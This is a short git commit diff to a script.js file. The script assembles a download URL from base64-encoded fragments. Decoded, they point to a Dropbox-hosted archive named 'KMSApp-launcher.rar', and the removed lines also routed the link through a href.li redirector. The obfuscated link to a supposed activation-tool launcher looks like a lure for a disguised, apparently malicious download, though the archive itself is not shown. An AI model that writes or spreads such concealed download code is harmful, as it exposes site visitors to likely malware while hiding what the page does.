04936cfc08ac7ba971ff3330734cfa0e632afb6e
childishguy-1603 <tiannatlougeeygp1@gmail.com>
2026-04-26 15:48:52 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,7 @@
 (function() {
   const urlParts = [
-  'aHR0cHM6Ly9ocmVmLmxpLz8=',
-  'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2o5eTlzYXZzbWw2MDZia3NhNTRiMy9LTVNBcHAtbGF1bmNoZXIucmFyP3Jsa2V5PXZvYncxdGY3Yzh2bXNqZGx2OGF3b204MXMmc3Q9d2g0YmZsZTMmZGw9MQ=='
+  'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2o5eTlzYXZzbWw2MDZia3NhNTRiMy9LTVNBcHAtbGF1bmNoZXIucmFyPw==',
+  'cmxrZXk9dm9idzF0ZjdjOHZtc2pkbHY4YXdvbTgxcyZzdD13aDRiZmxlMyZkbD0w'
 ];
 
   function decodePart(encoded) {
